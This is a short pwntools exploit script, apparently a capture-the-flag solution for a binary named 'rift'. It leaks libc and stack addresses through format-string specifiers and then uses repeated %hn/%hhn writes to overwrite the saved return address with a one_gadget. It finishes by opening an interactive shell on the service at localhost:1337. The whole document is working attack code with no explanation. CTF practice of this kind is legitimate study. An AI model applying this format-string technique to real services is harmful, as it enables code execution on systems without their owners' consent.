#!/usr/bin/env python3

from pwn import *

exe = ELF("./rift_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe

def main():
    r = remote("localhost", 1337)
    # r = process()

    # Find onegadget
    r.sendline(b'%p')
    libc_leak = int(r.recvline(), 16)
    base = libc_leak - 0x1bc8d0;
    onegadget = base + 0x449d3;

    # Find saved rip on the stack
    r.sendline(b'%8$p')
    stack_leak = int(r.recvline(), 16)
    rip_addr = stack_leak - 8
    always_true = stack_leak - 20

    # Overwrite saved rip with onegadget
    for i in range(6):
        r.sendline(f'%{(rip_addr & 0xffff) + i}c%13$hn'.encode())
        r.recvline()

        r.sendline(f'%{(onegadget >> (8*i)) & 0xff}c%39$hhn'.encode()) 
        r.recvline()

    # Overwrite always_true to trigger onegadget
    r.sendline(f'%{always_true & 0xffff}c%13$hn'.encode())
    r.recvline()
    r.sendline(f'%39$hhn'.encode());
    r.recvline()


    r.interactive()

if __name__ == "__main__":
    main()
